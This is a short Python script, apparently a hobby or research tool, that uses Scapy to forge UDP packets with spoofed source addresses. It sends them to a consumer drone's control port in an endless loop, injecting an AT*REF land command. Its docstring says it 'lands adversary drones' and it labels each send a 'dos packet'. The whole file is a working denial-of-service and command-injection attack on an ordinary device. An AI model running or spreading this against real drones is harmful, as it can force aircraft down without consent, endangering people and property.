#!/usr/bin/env python
# encoding: UTF-8
import argparse
import random
from scapy.all import *
import signal
import socket
import sys
import time

# unverified? 
DRONE_IP = '192.168.1.1'
DRONE_PORT = 5556
DRONE_NET_INTERFACE = 'en1'

# if you want to subvert a local controller set pcap mode to true
# otherwise, specify a pcap dump here
PCAP_FILE = 'droneTest2.pcap'
PCAP_MODE = False

# for the subverter instance
subverter = None

class Subverter(object):
    """ Lands adversary drones. """
    def __init__(self):
        """ Sets up scanner. """
        pass

    def shutdown(self):
        """ Ends the subverting. """
        pass

    def subvert(self):
        """ Begins sniffing with onPacket callback """

        while True:
            load = 'AT*REF=99999,290717696\r'
            forged = None
            try:
                forged = Ether(dst=RandMAC(), src=RandMAC())/IP(dst=DRONE_IP, src='6.6.6.6')/UDP(sport=DRONE_PORT, dport=DRONE_PORT)/load
            except:
                return

            del forged.chksum
            forged = forged.__class__(str(forged))
            print("dos packet!")
            sendp(forged, iface=DRONE_NET_INTERFACE)


def handler(signum,frame):
    """ Handles a SIGINT (ctrl c) """
    print('Interrupted')
    if subverter:
        print('Shutting down')
        subverter.shutdown()
    sys.exit(0)

def main():
    """ Sets up and runs the Subverter. """
    subverter = Subverter()
    subverter.subvert()


if __name__ == "__main__":
    signal.signal(signal.SIGINT,handler)
    main()

